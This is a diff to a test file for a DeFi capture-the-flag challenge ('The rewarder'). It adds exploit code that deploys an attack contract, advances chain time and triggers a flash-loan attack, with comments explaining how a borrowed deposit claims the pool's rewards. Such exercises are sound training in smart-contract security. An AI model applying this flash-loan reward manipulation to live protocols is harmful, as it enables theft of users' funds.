@@ -66,6 +66,21 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Since attacker has not called distributeRewards yet, we are currently at the start of the a new round
+        // so anything we deposit, we should be able to get rewards from, and withdraw -> payback flash loan
+        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
+
+        // Attack flow: flashloan for entire pool amt (1000), implement execute on IFlashLoanEtherReceiver to deposit the borrowed amount (1000)
+        // Require check will pass, then withdraw 1000 from balances
+
+        const AttackFactory = await ethers.getContractFactory('AttackRewarder', attacker);
+        this.attackFactory = await AttackFactory.deploy(this.liquidityToken.address, this.rewardToken.address, this.flashLoanPool.address, this.rewarderPool.address);
+
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await this.attackFactory.connect(attacker).attack();
+
+        console.log("Attacker RWD balance: ", ethers.utils.formatEther(await this.rewardToken.balanceOf(attacker.address)));
     });
 
     after(async function () {
